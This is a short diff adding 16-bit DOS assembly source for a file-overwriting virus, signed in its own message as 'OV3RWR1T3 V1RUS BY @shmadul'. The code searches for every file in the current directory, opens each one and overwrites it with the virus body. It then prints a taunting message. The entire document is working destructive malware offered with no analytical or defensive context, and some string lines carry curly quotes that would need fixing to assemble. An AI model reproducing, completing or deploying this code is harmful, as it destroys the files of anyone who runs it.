@@ -1,0 +1,39 @@
+              org 0100h
+Start:
+                mov ah, 4eh
+                mov cx, 20h
+Overwrite:
+	     mov dx, AllFiles             
+	     int 21h
+                jc NoMoreFiles    
+                mov ax, 3d01h                   
+	     mov dx, 9eh                  
+ 	     int 21h
+                jc Next
+                mov bx, ax
+                mov ah, 40h
+                mov cx, VirSize
+                mov dx, Start
+                int 21h
+                mov ah, 3eh
+                int 21h
+
+Next:
+                mov ah, 4fh
+                jmp Overwrite
+
+NoMoreFiles:
+                mov ah, 9           
+                mov dx, lolz         
+                int 21h
+                mov ah, 4ch       
+                int 21h
+
+AllFiles:       db "*.*",0             
+lolz:           db 7,7,7
+                db “R1P YOUR Files...”
+                db 13,10               
+                db "OV3RWR1T3 V1RUS BY @shmadul”,13,10
+                db "$"
+
+VirSize         equ $ - Start
